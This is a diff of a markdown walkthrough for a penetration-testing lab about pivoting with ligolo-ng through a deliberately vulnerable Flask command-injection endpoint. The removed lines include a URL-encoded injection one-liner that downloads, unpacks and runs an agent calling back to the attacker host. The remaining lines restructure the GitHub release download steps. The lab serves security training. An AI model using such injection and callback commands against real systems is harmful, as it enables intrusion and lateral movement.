@@ -80,36 +80,31 @@ curl "http://192.168.56.20:5000/cmd?cmd=hostname"
 
 Now exploit it to run a ligolo-ng **agent** on the pivot and connect it back to a ligolo-ng **proxy** on the attacker. The lab intentionally does not preinstall the agent so you must use the Flask command-injection to fetch and run it on `pivot`.
 
-There are two common approaches:
-
-- Option A — download ligolo-ng from a public release on the internet (replace `<..._URL>` below with the correct URL for your architecture):
-
-```bash
-curl "http://192.168.56.20:5000/cmd?cmd=wget%20-O%20%2Ftmp%2Fagent.tgz%20%3CLIGOLO_AGENT_TGZ_URL%3E%20%26%26%20cd%20%2Ftmp%20%26%26%20tar%20-xzf%20agent.tgz%20%26%26%20chmod%20%2Bx%20agent%20%26%26%20%2Ftmp%2Fagent%20-connect%20192.168.56.10%3A11601%20-ignore-cert%20%26"
-```
-
-- Option B — host the ligolo-ng `agent` binary from the attacker machine (e.g. `python3 -m http.server`) and pull it from pivot using the command injection endpoint.
-
-This is the most reliable approach for the lab because it avoids hunting for the correct release URL mid-exploit.
-
 #### 2a) Download ligolo-ng proxy + agent on attacker (GitHub Releases)
 
 ```bash
 vagrant ssh attacker
 mkdir -p ~/ligolo && cd ~/ligolo
+```
 
-# Find the correct downloads for your attacker architecture (this lab uses x86_64/amd64)
+Find the correct downloads for your attacker architecture (this lab uses x86_64/amd64)
+
+```bash
 uname -m
 curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url
+```
 
-# Recommended: automatically pick the *latest* Linux amd64 URLs from the GitHub API:
-PROXY_URL="$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url | grep 'linux_amd64' | grep 'proxy' | head -n 1 | cut -d '\"' -f 4)"
-AGENT_URL="$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url | grep 'linux_amd64' | grep 'agent' | head -n 1 | cut -d '\"' -f 4)"
-echo "$PROXY_URL"
-echo "$AGENT_URL"
+Recommended: automatically pick the *latest* Linux amd64 URLs from the GitHub API:
+```bash
+# this will give you the url's directly
+curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url | grep 'linux_amd64' | grep 'proxy' | head -n 1 | cut -d '\"' -f 4
 
-curl -L -o proxy.tgz "$PROXY_URL"
-curl -L -o agent.tgz "$AGENT_URL"
+curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url | grep 'linux_amd64' | grep 'agent' | head -n 1 | cut -d '\"' -f 4
+```
+then download them usinf curl or wget
+```bash
+curl -L -o proxy.tgz "proxy_you_found"
+curl -L -o agent.tgz "agent_you_found"
 tar -xzf proxy.tgz
 tar -xzf agent.tgz
 chmod +x proxy agent
